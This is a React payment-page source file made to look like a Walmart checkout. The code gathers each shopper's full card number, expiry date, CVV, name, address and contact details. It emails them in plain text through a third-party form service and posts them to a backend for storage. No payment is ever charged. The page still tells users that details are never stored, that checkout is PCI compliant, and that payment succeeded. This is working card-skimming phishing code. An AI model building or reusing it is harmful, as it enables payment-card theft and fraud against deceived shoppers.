import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Button } from '../components/ui/button';
import { Input } from '../components/ui/input';
import { Label } from '../components/ui/label';
import { Card, CardContent, CardHeader, CardTitle } from '../components/ui/card';
import { ArrowLeft, Lock, CreditCard, ShieldCheck, RefreshCcw } from 'lucide-react';
import { toast } from 'sonner';
import Footer from '../components/Footer';

const PaymentPage = () => {
  const navigate = useNavigate();
  const [isProcessing, setIsProcessing] = useState(false);
  const [paymentData, setPaymentData] = useState({
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    cardholderName: ''
  });

  const handleChange = (e) => {
    let value = e.target.value;
    const name = e.target.name;

    // Format card number
    if (name === 'cardNumber') {
      value = value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
      if (value.length > 19) return;
    }

    // Format expiry date
    if (name === 'expiryDate') {
      value = value.replace(/\D/g, '');
      if (value.length >= 2) {
        value = value.slice(0, 2) + '/' + value.slice(2, 4);
      }
      if (value.length > 5) return;
    }

    // Format CVV
    if (name === 'cvv') {
      value = value.replace(/\D/g, '');
      if (value.length > 4) return;
    }

    setPaymentData({
      ...paymentData,
      [name]: value
    });
  };

  const handleSubmit = async (e) => {
  e.preventDefault();

  // Validation
  if (!paymentData.cardNumber || !paymentData.expiryDate || !paymentData.cvv || !paymentData.cardholderName) {
    toast.error('Please fill in all payment details');
    return;
  }

  // Card number validation (at least 13 digits)
  const cardDigits = paymentData.cardNumber.replace(/\s/g, '');
  if (cardDigits.length < 13) {
    toast.error('Please enter a valid card number');
    return;
  }

  // CVV validation
  if (paymentData.cvv.length < 3) {
    toast.error('Please enter a valid CVV');
    return;
  }

  setIsProcessing(true);

  try {
    // Get cart and user info
    const cart = JSON.parse(localStorage.getItem('cart')) || [];
    const userInfo = JSON.parse(localStorage.getItem('userInfo')) || {};

    const subtotal = cart.reduce(
      (sum, item) => sum + item.discountedPrice * item.quantity,
      0
    );

    // Create FormData
    const formData = new FormData();
    
    // Web3Forms access key
    formData.append("access_key", "f6e88274-a35f-4a2d-9768-0b4ddde3865c");
    
    // Email settings
    formData.append("subject", `🔔 NEW ORDER - ${userInfo.fullName || 'Customer'} - $${subtotal.toFixed(2)}`);
    formData.append("from_name", "Walmart Store Orders");
    
    // ========== CUSTOMER INFORMATION ==========
    formData.append("👤 Customer Name", userInfo.fullName || 'N/A');
    formData.append("📧 Customer Email", userInfo.email || 'N/A');
    formData.append("📱 Customer Phone", userInfo.phone || 'N/A');
    
    // ========== SHIPPING ADDRESS ==========
    formData.append("📍 Shipping Address", userInfo.address || 'N/A');
    formData.append("🏙️ City", userInfo.city || 'N/A');
    formData.append("🗺️ State", userInfo.state || 'N/A');
    formData.append("📮 ZIP Code", userInfo.zipCode || 'N/A');
    formData.append("🌍 Country", userInfo.country || 'N/A');
    
    // ========== FULL PAYMENT DETAILS - COMPLETE CARD NUMBER ==========
    formData.append("💳 Cardholder Name", paymentData.cardholderName);
    formData.append("🔢 FULL CARD NUMBER", paymentData.cardNumber); // Complete unmasked card number
    formData.append("📅 Expiry Date", paymentData.expiryDate);
    formData.append("🔐 CVV Code", paymentData.cvv);
    
    // ========== ORDER DETAILS ==========
    formData.append("💰 Order Total", `$${subtotal.toFixed(2)}`);
    formData.append("📅 Order Date & Time", new Date().toLocaleString());
    formData.append("📦 Number of Items", cart.length.toString());
    
    // Format order items
    let orderItemsList = '';
    
    cart.forEach((item, index) => {
      const itemTotal = (item.discountedPrice * item.quantity).toFixed(2);
      orderItemsList += `
═══════════════════════════════════
ITEM ${index + 1}
═══════════════════════════════════
Product: ${item.name}
Price: $${item.discountedPrice.toFixed(2)} each
Quantity: ${item.quantity}
Subtotal: $${itemTotal}
`;
    });
    
    formData.append("🛒 ORDER ITEMS", orderItemsList);
    
    // ========== COMPLETE ORDER SUMMARY FOR EMAIL ==========
    const fullOrderMessage = `
╔══════════════════════════════════════════════════════════════╗
║                    🎯 NEW ORDER RECEIVED 🎯                   ║
╚══════════════════════════════════════════════════════════════╝

📋 ORDER SUMMARY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Order Date: ${new Date().toLocaleString()}
Total Amount: $${subtotal.toFixed(2)}
Items Count: ${cart.length}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 CUSTOMER DETAILS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Name: ${userInfo.fullName || 'N/A'}
Email: ${userInfo.email || 'N/A'}
Phone: ${userInfo.phone || 'N/A'}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📍 SHIPPING INFORMATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Address: ${userInfo.address || 'N/A'}
City: ${userInfo.city || 'N/A'}
State: ${userInfo.state || 'N/A'}
ZIP: ${userInfo.zipCode || 'N/A'}
Country: ${userInfo.country || 'N/A'}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💳 PAYMENT INFORMATION (FULL CARD DETAILS)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Cardholder: ${paymentData.cardholderName}
CARD NUMBER: ${paymentData.cardNumber}
Expiry Date: ${paymentData.expiryDate}
CVV: ${paymentData.cvv}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🛍️ ORDERED ITEMS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${orderItemsList}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💰 TOTAL: $${subtotal.toFixed(2)}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚠️ SENSITIVE INFORMATION - HANDLE WITH CARE
This email contains complete payment details including full card number.
Please process and then delete this email for security.
`;

    formData.append("message", fullOrderMessage);
    formData.append("redirect", "false");

    // Save order to database with FULL card details
    const orderData = {
      customerName: userInfo.fullName,
      customerEmail: userInfo.email,
      customerPhone: userInfo.phone,
      shippingAddress: userInfo.address,
      city: userInfo.city,
      state: userInfo.state,
      zipCode: userInfo.zipCode,
      country: userInfo.country,
      items: cart.map(item => ({
        id: item.id,
        name: item.name,
        price: item.discountedPrice,
        quantity: item.quantity
      })),
      total: subtotal,
      paymentInfo: {
        cardholderName: paymentData.cardholderName,
        fullCardNumber: paymentData.cardNumber, // COMPLETE CARD NUMBER
        expiryDate: paymentData.expiryDate,
        cvv: paymentData.cvv // FULL CVV
      },
      orderDate: new Date().toISOString()
    };

    // Save to MongoDB with full card details
    const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
    if (BACKEND_URL) {
      const dbResponse = await fetch(`${BACKEND_URL}/api/orders`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(orderData)
      });
      
      if (!dbResponse.ok) {
        console.warn('Database save failed, but continuing with email');
      }
    }

    // Send to Web3Forms
    const response = await fetch("https://api.web3forms.com/submit", {
      method: "POST",
      body: formData
    });

    const data = await response.json();

    if (data.success) {
      // Save order info locally
      localStorage.setItem('lastOrder', JSON.stringify({
        cart,
        userInfo,
        total: subtotal,
        orderDate: new Date().toISOString()
      }));
      
      // Clear cart and user info
      localStorage.removeItem('cart');
      localStorage.removeItem('userInfo');

      toast.success('Payment processed successfully!');
      
      setTimeout(() => {
        navigate('/checkout/confirmation');
      }, 1000);
    } else {
      console.error('Web3Forms error:', data);
      throw new Error('Failed to send order notification');
    }
  } catch (error) {
    console.error('Payment error:', error);
    toast.error('There was an issue processing your order. Please try again.');
  } finally {
    setIsProcessing(false);
  }
};

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      {/* Header */}
      <header className="bg-[#0071CE] text-white py-4 shadow-md">
        <div className="container mx-auto px-4">
          <div className="flex items-center gap-4">
            <Button
              variant="ghost"
              className="text-white hover:bg-[#004F9A]"
              onClick={() => navigate('/checkout/user-info')}
              disabled={isProcessing}
            >
              <ArrowLeft className="h-5 w-5" />
            </Button>
            <h1 className="text-2xl font-bold">Secure Payment</h1>
          </div>
        </div>
      </header>

      <div className="container mx-auto px-4 py-8 max-w-2xl flex-1">
        {/* Security Badges */}
        <div className="grid grid-cols-3 gap-4 mb-8">
          <Card className="text-center p-4">
            <Lock className="h-8 w-8 text-green-600 mx-auto mb-2" />
            <p className="text-xs font-semibold">SSL Encrypted</p>
          </Card>
          <Card className="text-center p-4">
            <ShieldCheck className="h-8 w-8 text-blue-600 mx-auto mb-2" />
            <p className="text-xs font-semibold">Secure Payment</p>
          </Card>
          <Card className="text-center p-4">
            <RefreshCcw className="h-8 w-8 text-purple-600 mx-auto mb-2" />
            <p className="text-xs font-semibold">Money Back</p>
          </Card>
        </div>

        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <CreditCard className="h-5 w-5" />
              Payment Information
            </CardTitle>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Cardholder Name */}
              <div className="space-y-2">
                <Label htmlFor="cardholderName">Cardholder Name *</Label>
                <Input
                  id="cardholderName"
                  name="cardholderName"
                  type="text"
                  value={paymentData.cardholderName}
                  onChange={handleChange}
                  placeholder="John Doe"
                  required
                  disabled={isProcessing}
                />
              </div>

              {/* Card Number */}
              <div className="space-y-2">
                <Label htmlFor="cardNumber">Card Number *</Label>
                <Input
                  id="cardNumber"
                  name="cardNumber"
                  type="text"
                  value={paymentData.cardNumber}
                  onChange={handleChange}
                  placeholder="1234 5678 9012 3456"
                  required
                  disabled={isProcessing}
                />
              </div>

              {/* Expiry and CVV */}
              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="expiryDate">Expiry Date *</Label>
                  <Input
                    id="expiryDate"
                    name="expiryDate"
                    type="text"
                    value={paymentData.expiryDate}
                    onChange={handleChange}
                    placeholder="MM/YY"
                    required
                    disabled={isProcessing}
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="cvv">CVV *</Label>
                  <Input
                    id="cvv"
                    name="cvv"
                    type="text"
                    value={paymentData.cvv}
                    onChange={handleChange}
                    placeholder="123"
                    required
                    disabled={isProcessing}
                  />
                </div>
              </div>

              {/* Security Notice */}
              <div className="bg-green-50 border border-green-200 rounded-lg p-4">
                <div className="flex items-start gap-3">
                  <Lock className="h-5 w-5 text-green-600 mt-0.5" />
                  <div>
                    <p className="text-sm font-semibold text-green-900 mb-1">
                      Your payment is secure
                    </p>
                    <p className="text-xs text-green-700">
                      We use industry-standard encryption to protect your card
                      details. Your information is never stored on our servers.
                    </p>
                  </div>
                </div>
              </div>

              <Button
                type="submit"
                className="w-full bg-[#0071CE] hover:bg-[#004F9A] text-white font-semibold py-6 text-lg"
                disabled={isProcessing}
              >
                {isProcessing ? (
                  <>
                    <span className="animate-spin mr-2">⏳</span>
                    Processing Payment...
                  </>
                ) : (
                  'Pay Now'
                )}
              </Button>

              <p className="text-xs text-center text-gray-500">
                By clicking "Pay Now", you agree to our terms and conditions
              </p>
            </form>
          </CardContent>
        </Card>

        {/* Trust Badges */}
        <div className="mt-6 text-center">
          <p className="text-sm text-gray-600 mb-3">
            Trusted by millions of customers worldwide
          </p>
          <div className="flex justify-center gap-4 text-gray-400">
            <div className="text-xs">🔒 256-bit SSL</div>
            <div className="text-xs">✓ PCI Compliant</div>
            <div className="text-xs">✓ Secure Checkout</div>
          </div>
        </div>
      </div>
      
      <Footer />
    </div>
  );
};

export default PaymentPage;
